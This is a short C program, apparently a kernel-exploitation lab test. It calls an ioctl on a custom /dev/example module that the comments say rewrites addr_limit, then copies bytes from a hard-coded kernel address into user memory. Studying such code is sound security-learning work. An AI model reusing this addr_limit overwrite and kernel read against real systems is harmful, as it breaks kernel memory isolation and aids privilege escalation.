#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<sys/ioctl.h>
#include<fcntl.h>

//author : afang
//comment: what a nice day, isn't it?!

int main(){

	//interact with kernel module to test if module is effective..
	char *file = "/dev/example";
	char *buf = "test String...\n";
	struct temp{
		size_t len;
		char* buf;
		char* addr;
	}test;

	int fd = open(file, O_RDWR);
	struct temp* p1 = &test;
	p1->buf = (char*)malloc(0x20);
	//trigger output of stack addr for testing...
	ioctl(fd, 5, (size_t)p1); //right now, addr_limit has been modified into all spaces...
	printf("Accepting input..\n");
	getchar();
	//try to access kernel space...	
	char *caster = (char*)malloc(0x30);
	memcpy(caster, (size_t*)0xffffffff810a1c50, 10);
	printf("%p\n", (size_t*)caster);

	return 0;
}

